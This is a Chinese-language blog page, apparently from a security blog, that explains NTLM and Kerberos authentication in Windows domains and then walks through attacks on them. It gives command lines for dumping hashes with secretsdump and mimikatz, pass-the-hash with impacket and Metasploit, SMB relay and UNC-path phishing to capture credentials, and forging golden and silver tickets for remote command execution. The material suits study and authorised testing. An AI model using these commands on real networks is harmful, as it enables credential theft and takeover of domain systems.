@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="网络安全,攻防研究" />
+  <meta name="author" content="B Stark" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+     B.Stark&#39;Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="B.Stark'Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">BStark</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title"></div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-01-23 22:22:33
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    <b>#</b> 内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h2><p>NTLM认证机制在工作组环境下和在域环境下是不同的, 域环境下有两套认证体系,默认使用Kerberos,当kerberos 认证错误时则采用NTLM认证</p>
+<p><strong>Windows如何判断域登陆OR本地登陆</strong>(NTLM&amp;Kerberos选择)</p>
+<p>如果是本地用户登录的话将会使用本地数据库进行认证，如果是域登录的话将会丢给Kerberos SSP去认证。当用户按下键盘Crt+Alt+Del后，Winlogon读取完用户的身份凭据后，把它交给本地安全机构（LSA）<strong>LSASS.exe</strong>，LSA会对凭证做一系列安全加密编码操作如MD4加密，加密结束后会通过SSPI(安全支持提供者接口，该接口负责与Kerberos和NTLM服务沟通)来判断是应该交给Ntlm处理，还是Kerberos SSPI进行处理。LSA首先根据用户输入UPN等信息会事先把身份认证请求传递到Kerberos SSP。</p>
+<p>Kerberos SSP验证用户登入目标是本地计算机还是域，如果是域则继续向下处理，如果是本地计算机则会向SSPI返回一条错误消息，SSPi将它将这个任务交回给GINA处理。</p>
+<p>SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM （Local Security Account Manager，本地安全账户管理器）数据库进行身份认证。使用NTLM SSP的身份认证过程与Windows NT系统的身份认证方法是相同的。</p>
+<p><strong>总结:</strong></p>
+<p>无论是域登录还是本地登录(NTLM&amp;Kerberos) 都会在本地由winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)-&gt;认证成功后舍弃明文密码,保存哈希,都存在抓取本地hash.</p>
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p><strong>工作组环境NTLM认证流程</strong></p>
+<p>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)-&gt;认证成功后舍弃明文密码,保存哈希</p>
+<ol>
+<li>首先用户在客户端输入username、password，然后客户端会先将用户输入的password进行hash计算并保存在本地，舍<br>弃明文密码</li>
+<li>客户端将username明文传输到服务器</li>
+<li>然后服务器会随机生成16字节的challenge挑战码返回给客户端</li>
+<li>客户端接收到challenge之后，会用第一步生成的hash对challenge进行加密（称为response），和challenge、<br>username一起发送给服务器</li>
+<li>服务器在接收到客户端发来的response、challenge、username，会拿着username在自己的SAM文件中查询出对应的<br>hash，并用hash对challenage客户端发来的response进行对比，相同则身份验证成功</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172808022.png" alt="image-20220222172808022"></p>
+<p><strong>域环境NTLM认证流程：</strong></p>
+<ol>
+<li>首先用户在客户端输入username、password，然后客户端会先将用户输入的password进行hash计算并保存在本<br>地，舍弃明文密码</li>
+<li>客户端将username明文传输到服务器</li>
+<li>然后服务器会随机生成16字节的challenge挑战码返回给客户端。</li>
+<li>客户端接收到challenge之后，会用第一步生成的hash对challenge进行加密（称为response），和challenge、<br>username一起发送给服务器</li>
+<li>服务端将客户端发来的信息转发给域控</li>
+<li>域控在接收到服务端发来的response、challenge、username，会拿着username在自己的活动目录数据库<br>（ntds.dit）中查询出对应的hash，并用hash对challenage进行一次加密，再与客户端发来的response进行对比，相<br>同则身份验证成功</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172849823.png" alt="image-20220222172849823"></p>
+<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><h4 id="域的Hash获取"><a href="#域的Hash获取" class="headerlink" title="域的Hash获取"></a>域的Hash获取</h4><p>与普通PC的Hash获取思路是一样的，但是要注意两个事情</p>
+<ol>
+<li>即使是DC,常规获取hash的思路依然只能获取本地用户的hash，并不能获取整个域的用户hash</li>
+<li>即使是域内用户机，常规获取hash的思路依然有可能拿到域管理员的hash，只要域管理员通过RDP登录过，就会将hash保存到 lsass 中</li>
+</ol>
+<ul>
+<li>Secretsdump脚本直接导出域Hash</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py 账号:密码@IP地址</span><br></pre></td></tr></table></figure>
+
+<p>其他常见的获取方法:</p>
+<p>1.NTDS.dit 获取域控hash（手动导出NTDS.dit、工具：NTDSDumpEx）</p>
+<p>2.VSSADMIN（卷影拷贝服务）</p>
+<p>3.Mimikatz的 dcsync 功能</p>
+<h4 id="哈希传递攻击-PTH"><a href="#哈希传递攻击-PTH" class="headerlink" title="哈希传递攻击 (PTH)"></a>哈希传递攻击 (<strong>PTH</strong>)</h4><ul>
+<li>利用impacket工具包等..： </li>
+</ul>
+<p>smbexec.py / psexec.py / wmiexec.py / atexec.py </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用方法： smbexec.py [domain/] username @ [Target IP Address] –hashes 哈希值</span><br><span class="line"></span><br><span class="line">smbexec.py domain/Administrator@192.168.10.2 -hashes aad3b435b51404eeaad3b435b51404ee:99d85d9d737629f593b11771123df22c </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>mimikatz的 pth 功能 </li>
+</ul>
+<p>语句： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:账号 /domain:密码 /ntlm:获取到的NTLM</span><br></pre></td></tr></table></figure>
+
+<p>在弹出cmd后，可以使用net use列出远程主机中的内容 sekurlsa::pth /user:账号 /domain:密码 /ntlm:获取到的NTLM</p>
+<p>利用 msf 模块：</p>
+<p> • exploit/windows/smb/psexec</p>
+<p> • exploit/windows/smb/psexec_psh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set rhost IP地址</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbuser 用户名</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbdomain 域名</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbpass 密码的hash值</span><br></pre></td></tr></table></figure>
+
+<h4 id="SMB重放攻击-中间人攻击"><a href="#SMB重放攻击-中间人攻击" class="headerlink" title="SMB重放攻击 (中间人攻击)"></a>SMB重放攻击 (中间人攻击)</h4><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/wKg0C158JVKASUlFAADWfRa5rDk155.jpg" alt="img"></p>
+<p><strong>重放攻击的ntlm认证过程</strong>：</p>
+<ol>
+<li>Client端还是正常向服务端发送登录请求，由于client端此时并不知道攻击者的存在，它以为请求是发送给了server端，但<br>实际上它是先发给了攻击者</li>
+<li>然后攻击者再拿着这个用户名伪装成client端发送给server端，此时server端正常返回一个challenge（挑战码）</li>
+<li>攻击者拿到这个challenge（挑战码）以后，再把它返回给client端</li>
+<li>而 client 端拿到 challenge 在本地和自己的密码DES加密以后，会把这个response再次发送给攻击者，此时client依然认<br>为攻击者就是server端</li>
+<li>最后，攻击者会拿着client端发过来的这个response再把它交给server端去验证</li>
+<li>server端此时到自己的数据库中对比，发现hash一致认证通过, 可见一次简单的smb中间人攻击就这样完成了</li>
+</ol>
+<p><strong>原理:</strong></p>
+<p>先欺骗SMB流量,后重放, 通过内网嗅探欺骗 利用获取的传输中的NET NTML hash.拿到NET NTML hash后可以代替<strong>对方</strong>直接impacket等工具登录.执行命令 </p>
+<p><strong>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash</strong> 格式为 username::domain:Challenge:HMAC-MD5:blob 这三个值就是相当于欺骗了凭证.</p>
+<p>攻击者充当客户端的服务器，并充当服务器的客户端。他从客户端消息中提取NTLM身份验证Blob，并将其放入服务器的修改后的消息中，反之亦然。最后，他可以根据需要使用经过身份验证的会话。</p>
+<p><strong>利用条件:</strong></p>
+<ul>
+<li>目标机不能开启smb签名，否则利用无效，一般情况下 <strong>Windows Server 机器会默认开启</strong>，而Windows [win7/8/8.1/10]<br>默认不会开启</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以利用nmap探测smb是否关闭</span><br><span class="line">nmap -sT -p <span class="number">445</span> -Pn --open --script smb-security-<span class="built_in">mode</span>.nse 目标IP</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>一些打了ms08-068[KB957097]补丁的老系统，如 Windows xp/2003 以下的系统，也无法利用</li>
+</ul>
+<p><strong>利用工具:</strong></p>
+<p> impacket 套件中的 smbrelayx.py，进行smb中继攻击监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 目标机IP地址 –e 木马路径</span><br></pre></td></tr></table></figure>
+
+<p>当目标机器 使用登录smb服务时,我们捕捉到了smb 的登录凭证hash 可以使用Hashcat破解就行了。</p>
+<p>之后拿着这个hash到目标机器中去尝试登录smb执行命令上线马子.</p>
+<p><strong>拓展：</strong></p>
+<p>在实际渗透过程中，往往会配合钓鱼进行，红队经常这么玩。</p>
+<p>1、在共享上放置特殊的目录，当用户点到这个目录的时候会自动请求攻击的SMB</p>
+<p>2、可以通过在 Client 经常访问的 Web 网站上插入 UNC 路径, 例如 <img src="\\192.168.1.2\logo.jpg" /> 以进行 SMB 请求 (当前用户凭据).</p>
+<p>3、在doc或邮件正文里插入文件，然后将相应的链接改为UNC路径（类似这种\servername\sharename格式），通过内网邮件发送给对方</p>
+<p>4、利用PDF的GoTobe和GoToR功能让对方打开PDF时自动请求SMB服务器上的文件等等。一般企业内部员工看到内部的邮件或公用共享文件夹会放松警惕，当点开之后，当前用户密码登录凭证已经被人拿到。<br>参考文章：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/200028">https://cloud.tencent.com/developer/news/200028</a></p>
+<p>5、metasploit中的auxiliary/docx/word_unc_injector会创建一个带有unc路径的word文件，当该文件被打开的时候攻击机器的msf上就会收到NTLMv2 hash。</p>
+<h2 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h2><p>kerberos认证涉及到三方</p>
+<p>1.访问服务的client</p>
+<p>2.提供服务的server</p>
+<p>3.KDC密钥分发中心,KDC分为AS和TGS</p>
+<p><strong>KDC密钥分发中心</strong></p>
+<p><strong>AS</strong>(Authentication Server)</p>
+<p>AS的作用就是验证Client端的身份(确定你是身份证本人),验证通过后就会给你一张TGT票给Client.</p>
+<p><strong>TGS</strong>(Ticket Granting Server)</p>
+<p>TGS的作用是通过AS发送给Client的票(TGT)换取访问Server的票(ST)</p>
+<h3 id="认证流程-1"><a href="#认证流程-1" class="headerlink" title="认证流程"></a>认证流程</h3><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172950947.png" alt="image-20220222172950947"></p>
+<p><strong>过程简述</strong></p>
+<p>①-②：<code>Client</code>向<code>kerberos</code>服务请求，希望获取访问<code>Server</code>的权限。 <code>kerberos</code>得到了这个消息，首先得判断<code>Client</code>是否是可信赖的， 也就是白名单黑名单的说法。</p>
+<p>这就是<code>AS(Authentication Service)</code>服务完成的工作，通过在<code>AD(Account Database)</code>中存储黑名单和白名单来区分<code>Client</code>。</p>
+<p>成功后，<code>AS(Authentication Service)</code>返回<code>TGT（Ticket Granting Ticket）</code>给<code>Client</code>。</p>
+<p>③-④：<code>Client</code>得到了<code>TGT（Ticket Granting Ticket）</code>后，继续向<code>kerberos</code>请求，希望获取访问 <code>Server</code>的权限。<code>kerberos</code>又得到了这个消息，这时候通过<code>Client </code>消息中的<code>TGT</code>，判断出了<code>Client</code>拥有了这个权限，给了<code>Client</code>访问<code>Server</code>的权限<code>Ticket</code>。</p>
+<p>⑤-⑥：<code>Client</code>得到<code>Ticket</code>后，终于可以成功访问<code>Server</code>。这个<code>Ticket</code>只是 针对这个<code>Server</code>，其他<code>Server</code>需要向<code>TGS(Ticket Granting Service)</code>申请。</p>
+<p><strong>较详简述</strong></p>
+<ol>
+<li><strong>AS_REQ</strong>: <code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>，请求凭据是<code>Client hash</code>加密的时间戳</li>
+<li><strong>AS_REP</strong>: <code>KDC</code>使用<code>Client hash</code>进行解密，如果结果正确就返回用<code>krbtgt hash</code>加密的<code>TGT</code>票据，<code>TGT</code>里面包含<code>PAC</code>，<code>PAC</code>包含<code>用户Client</code>的<code>sid</code>和<code>用户Client</code>所在的<code>组</code>。</li>
+<li><strong>TGS_REQ</strong>: <code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>发起针对特定<code>Server</code>的<code>TGS_REQ</code>请求</li>
+<li><strong>TGS_REP</strong>: <code>KDC</code>使用<code>krbtgt hash</code>进行解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]（这一步不管用户有没有访问<code>Server</code>的权限，只要<code>TGT</code>正确，就返回<code>TGS</code>票据 [<code>Ticket</code>]）</li>
+<li><strong>AP_REQ</strong>: <code>Client</code>拿着<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></li>
+<li><strong>AP_REP</strong>: <code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限。</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222173025997.png" alt="image-20220222173025997"></p>
+<p><strong>自己理解</strong></p>
+<p>(1)client拿着自己的hash申请 向 KDC下属的AS身份认证机构 请求认证(去车站拿身份证实名)</p>
+<p>(2)KDC下属的AS身份认证机构 审核通过后,返回用krbtgt hash<code>加密的</code>TGT`票据给client. </p>
+<p>(3)<code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>下属的TGS去买票 要用什么服务</p>
+<p>(4)<code>KDC</code>下属的TGS 使用<code>krbtgt hash</code>进行对拿过来的TGT凭证 解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]</p>
+<p>(5)<code>Client</code>拿着KDC 下属的TGS给的<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></p>
+<p>(6)<code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限.</p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p><strong>黄金票据</strong></p>
+<p><strong>原理</strong>: 问题出在第二步. 我们如果拿到krbtgt账号的 hash 就可以直接跳过 AS身份认证的部分. 直接拿着krbtgt账号的 hash去伪造 TGT票据 也就是黄金票据.</p>
+<p><strong>伪造过程</strong></p>
+<p>条件要求：</p>
+<ol>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>域的KRBTGT账户NTLM-HASH</li>
+<li>伪造用户名，可以是任意用户名</li>
+</ol>
+<p>第一步：获取域控的 krbtgt NTLM Hash（在域控中）</p>
+<ul>
+<li>通过mimikatz，获取 krbtgt 的哈希值</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令：lsadump::dcsync /domain:域名/user:krbtgt</span><br><span class="line"></span><br><span class="line">mimikatz# sekurlsa::kerberos</span><br><span class="line">mimikatz# sekurlsa::logonpassword</span><br><span class="line">mimikatz# lsadump::dsync /domain:xxx.xxx.xxx /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p>第二步：生成伪造黄金票据 （在client端）</p>
+<ul>
+<li>得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成黄金票据 golden.kiribi，即成功伪造TGT</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令：kerberos::golden /user:伪造的用户名/domain:域名 /sid:user-sid /krbtgt:ntlmhash值 /ticket:票据名称</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：域的SID （不包括后<span class="number">3</span>位）</span><br><span class="line">/krbtgt: krbtgt 的 NTLM-HASH 值</span><br><span class="line">/ticket:生成的票据名称</span><br></pre></td></tr></table></figure>
+
+<p> 第三步：获取权限（在client端）</p>
+<p> • 清空本地票据缓存，导入伪造的票据</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kerberos::<span class="title">list</span> #查看本地保存的票据，观察<span class="title">client</span> <span class="title">name</span></span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">purge</span> #清理本地票据缓存</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">ptt</span> 票据名 #导入伪造的黄金票据</span></span><br><span class="line"><span class="function"><span class="title">cmd</span>下查看 <span class="title">klist</span> # 查看票据</span></span><br><span class="line"><span class="function">* 注意：票据20分钟内有效，过期之后可以再次导入</span></span><br></pre></td></tr></table></figure>
+
+<p> 第四步：利用伪造的黄金票据：（在client端）<br>• 远程登陆和执行命令。在Client端通过Psexec.exe工具来与域中其他主机进行连接，连接成功了以后，是直接返回一个cmd的交互式界面，并且是最高权限。<br>• 注意：最后进行远程登录和命令执行时，为计算机全名，不能为IP地址</p>
+<p><strong>白银票据</strong></p>
+<p><strong>原理</strong>: 问题出在第四步. <code>KDC</code>下属的TGS 使用<code>krbtgt hash</code>进行对拿过来的TGT凭证 解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]  .如果拿到Server账号hash就可以直接跳过 AS身份认证的部分,服务授权部分. 直接拿着Server账号hash去伪造 TS票据 也就是白银票据.</p>
+<p><strong>特点:</strong></p>
+<ol>
+<li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主<br>体名称的服务帐户进行加密和签名。</li>
+<li>白银票据是伪造TGS，这意味着白银票据仅限于特定服务器上的任何服务。</li>
+<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效<br>TGS可以完全伪造PAC</li>
+<li>攻击者需要服务帐户的NTLM hash</li>
+<li>TGS是伪造的，所以没有和TGT通信，意味着绕过DC的身份验证。</li>
+<li>任何事件日志都在目标服务器上。</li>
+</ol>
+<p><strong>条件:</strong></p>
+<ol>
+<li>域名称</li>
+<li>域的 SID 值</li>
+<li>域的服务账户的密码HASH</li>
+<li>伪造的用户名，可以是任意用户名，一般是伪造administrator</li>
+<li>需要访问的服务</li>
+</ol>
+<p>伪造过程:</p>
+<p>第一步：用域管理员账号登录主域控，使用 mimikatz.exe 执行命令抓取hash（在域控中执行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ø 命令：</span><br><span class="line">• privilege::debug</span><br><span class="line">• sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p>第二步：伪造票据。得到服务账户的 HASH 之后使用 mimikatz中的kerberos::golden功能生成白银票据TGS ticket。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID值 /target:目标主机/rc4:目标主机的HASH值（NTLM）/service:需要伪造</span><br><span class="line">的服务 /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">/domain：指定域名</span><br><span class="line">/sid：sid号（除最后一部分）</span><br><span class="line">/target：目标主机计算机名</span><br><span class="line">/rc4：目标主机的hash(NTLM)</span><br><span class="line">/service：需要伪造的服务</span><br><span class="line">/user：需要伪造的用户名</span><br><span class="line">/ppt：伪造了以后直接写入到内存中</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> 第二步：伪造票据。其中：白银票据对应的服务列表</p>
+<table>
+<thead>
+<tr>
+<th>服务类型</th>
+<th>白银票据对应的服务名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST/RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST/HOST</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST/HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations including Mimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS/LDAP/CIFS</td>
+</tr>
+</tbody></table>
+<p>第三步：利用伪造的白银票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir //dc.local\C$ </span><br></pre></td></tr></table></figure>
+
+<p>生成白银票据后，再访问目标主机，无需输密码，访问成功</p>
+<p>第三步：利用伪造的白银票据执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\dc.local cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>扩展:</strong></p>
+<ul>
+<li>白银票据的利用（扩展）：利用HOST服务修改和创建计划任务<br>需要导入一张 HOST Silver Ticket</li>
+</ul>
+<ol>
+<li><p>创建 HOST Silver Ticket 银票</p>
+</li>
+<li><p>创建计划任务，创建完成后，查看是否添加成功。</p>
+</li>
+</ol>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID /target:目标主机 /rc4:目标主机的hash值 /service:HOST /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure>
+
+<p>  • 注意：如果现实无法加载列资源，使用命令 chcp 437 修改为美国编码即可执行</p>
+<ul>
+<li>白银票据的利用（扩展）：使用WMI在目标系统上远程执行命令<br>• 需要导入两张Silver Ticket，一张 host Silver Ticket，一张 rpcss Silver Ticket</li>
+</ul>
+<ol>
+<li><p>首先写入两个票据</p>
+</li>
+<li><p>执行wmic命令，在远程主机上创建新进程</p>
+</li>
+</ol>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:域名/sid:SID /target:目标主机 /rc4:目标主机的hash值 /service:host /user:伪造的用户名 /ptt</span><br><span class="line">kerberos::golden /domain:域名 /sid: SID /target:目标主机 /rc4:目标主机的hash值 /service:rpcss /user:伪造的用户名 /ptt</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="黄金票据与白银票据的区别"><a href="#黄金票据与白银票据的区别" class="headerlink" title="黄金票据与白银票据的区别"></a>黄金票据与白银票据的区别</h2><ol>
+<li><strong>访问权限不同：</strong><br>• 黄金票据：伪造TGT，可以获取任何Kerberos服务权限<br>• 白银票据：伪造TGS，只能访问指定的服务</li>
+<li><strong>加密方式不同：</strong><br>• 黄金票据：由Kerberos的Hash加密<br>• 白银票据：由服务账号（通常为计算机账户）Hash加密</li>
+<li><strong>认证流程不同：</strong><br>• 黄金票据：黄金票据的利用过程需要访问域控<br>• 白银票据：不需要认证，可以跳过KDC的认证</li>
+</ol>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/2/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-01-23 22:22:33
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        <b>#</b> 内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/0/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
